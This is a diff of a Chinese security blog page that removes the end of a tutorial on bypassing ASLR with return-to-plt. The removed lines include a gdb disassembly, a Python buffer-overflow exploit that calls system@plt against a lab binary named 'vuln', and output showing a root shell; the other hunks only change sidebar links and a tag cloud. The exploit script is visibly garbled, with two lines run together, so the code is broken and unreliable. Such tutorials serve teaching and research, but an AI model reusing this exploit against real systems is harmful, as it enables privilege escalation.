-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble shell</div><div class="line">Dump of assembler code <span class="keyword">for</span> function shell:</div><div class="line"> <span class="number">0x08048474</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x08048475</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x08048477</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x18</span>,%esp</div><div class="line"> <span class="number">0x0804847a</span> &lt;+<span class="number">6</span>&gt;: movl $<span class="number">0x80485a0</span>,(%esp)</div><div class="line"> <span class="number">0x08048481</span> &lt;+<span class="number">13</span>&gt;: call <span class="number">0x8048380</span> &lt;system@plt&gt;</div><div class="line"> <span class="number">0x08048486</span> &lt;+<span class="number">18</span>&gt;: movl $<span class="number">0x0</span>,(%esp)</div><div class="line"> <span class="number">0x0804848d</span> &lt;+<span class="number">25</span>&gt;: call <span class="number">0x80483a0</span> &lt;<span class="built_in">exit</span>@plt&gt;</div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>利用这些地址，我们就可以写出绕过ASLR(与NX)的漏洞利用代码！</p>
-<p><u>漏洞利用代码</u>：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">system = 0x8048380</div><div class="line">exit = 0x80483a0</div><div class="line">system_arg = 0x80485b5     #Obtained from hexdump output of executable 'vuln'</div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack("&lt;I",numystem + exit + system_arg</div><div class="line">buf = "A" * 272</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div></pre></td></tr></table></figure>
-<p>执行上述程序就可以获取root shell，如下所示：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
-<p><u>注意</u>： 为了获取这个root shell，可执行文件必须包含’system@PLT’与’exit@PLT’代码。在<a href="http://www.csyssec.org/20170101/bypassaslr-gotgor" target="_blank" rel="external">第三篇</a>中，我会谈谈利用GOT覆盖与GOT解引用技术，在可执行文件中并没有需要的PLT存根代码并且系统已经打开了ASLR的情况下，攻击者如何调用libc函数。 </p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第一篇章(return-to-plt)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ASLR/">ASLR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
 
 
   <nav id="page-nav">
@@ -657,6 +637,18 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
     </ul>
     <div class="widget">
       <ul>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170401/keylogger/">Keylogger检测</a></h6>
+          <!--  <span>四月 1, 2017</span> -->
+            </div>
+
+          </li>
         
           <li class="clearfix">
 
@@ -838,18 +830,6 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
 
           </li>
         
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170306/course-zhiqianglin1/">名人课堂-高级数字取证与数据逆向工程</a></h6>
-          <!--  <span>三月 6, 2017</span> -->
-            </div>
-
-          </li>
-        
       </ul>
     </div>
   </div>
@@ -870,7 +850,7 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
   <div class="widget-wrap">
     <h3 class="widget-title">标签导航</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ASLR/" style="font-size: 11.67px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Binary/" style="font-size: 10.83px;">Binary</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.5px;">Conference</a> <a href="/tags/Conferences/" style="font-size: 10px;">Conferences</a> <a href="/tags/Course/" style="font-size: 13.33px;">Course</a> <a href="/tags/Exploit/" style="font-size: 17.5px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/Heap/" style="font-size: 10.83px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10.83px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14.17px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 15.83px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 16.67px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.33px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.33px;">Linux</a> <a href="/tags/Malware/" style="font-size: 15px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.33px;">Memory</a> <a href="/tags/Migration/" style="font-size: 10.83px;">Migration</a> <a href="/tags/Overflow/" style="font-size: 10.83px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 10.83px;">Paper</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Ph-D/" style="font-size: 10.83px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.5px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 15px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 11.67px;">Rootkit</a> <a href="/tags/Sandbox/" style="font-size: 10.83px;">Sandbox</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Stack/" style="font-size: 10.83px;">Stack</a> <a href="/tags/System/" style="font-size: 19.17px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.67px;">Systemcall</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 18.33px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 10px;">XEN</a>
+      <a href="/tags/ASLR/" style="font-size: 11.67px;">ASLR</a> <a href="/tags/ASPLOS/" style="font-size: 10px;">ASPLOS</a> <a href="/tags/Binary/" style="font-size: 10.83px;">Binary</a> <a href="/tags/Compiler/" style="font-size: 10px;">Compiler</a> <a href="/tags/Conference/" style="font-size: 12.5px;">Conference</a> <a href="/tags/Conferences/" style="font-size: 10px;">Conferences</a> <a href="/tags/Course/" style="font-size: 13.33px;">Course</a> <a href="/tags/Exploit/" style="font-size: 17.5px;">Exploit</a> <a href="/tags/Forensics/" style="font-size: 10px;">Forensics</a> <a href="/tags/Heap/" style="font-size: 10.83px;">Heap</a> <a href="/tags/Instrumentation/" style="font-size: 10.83px;">Instrumentation</a> <a href="/tags/Introspection/" style="font-size: 14.17px;">Introspection</a> <a href="/tags/KVM/" style="font-size: 15.83px;">KVM</a> <a href="/tags/Kernel/" style="font-size: 16.67px;">Kernel</a> <a href="/tags/Libvmi/" style="font-size: 13.33px;">Libvmi</a> <a href="/tags/Linux/" style="font-size: 13.33px;">Linux</a> <a href="/tags/Malware/" style="font-size: 15.83px;">Malware</a> <a href="/tags/Memory/" style="font-size: 13.33px;">Memory</a> <a href="/tags/Migration/" style="font-size: 10.83px;">Migration</a> <a href="/tags/Overflow/" style="font-size: 10.83px;">Overflow</a> <a href="/tags/PIN/" style="font-size: 10px;">PIN</a> <a href="/tags/Paper/" style="font-size: 10.83px;">Paper</a> <a href="/tags/Papers/" style="font-size: 10px;">Papers</a> <a href="/tags/Ph-D/" style="font-size: 10.83px;">Ph.D</a> <a href="/tags/Ppaerwriting/" style="font-size: 10px;">Ppaerwriting</a> <a href="/tags/Professor/" style="font-size: 12.5px;">Professor</a> <a href="/tags/QEMU/" style="font-size: 15px;">QEMU</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/RR/" style="font-size: 10px;">RR</a> <a href="/tags/Rootkit/" style="font-size: 11.67px;">Rootkit</a> <a href="/tags/Sandbox/" style="font-size: 10.83px;">Sandbox</a> <a href="/tags/Security/" style="font-size: 20px;">Security</a> <a href="/tags/Shellcode/" style="font-size: 10px;">Shellcode</a> <a href="/tags/Stack/" style="font-size: 10.83px;">Stack</a> <a href="/tags/System/" style="font-size: 19.17px;">System</a> <a href="/tags/Systemcall/" style="font-size: 11.67px;">Systemcall</a> <a href="/tags/Valgrind/" style="font-size: 10px;">Valgrind</a> <a href="/tags/Virtualization/" style="font-size: 18.33px;">Virtualization</a> <a href="/tags/Volatility/" style="font-size: 10px;">Volatility</a> <a href="/tags/XEN/" style="font-size: 10px;">XEN</a>
     </div>
   </div>
 
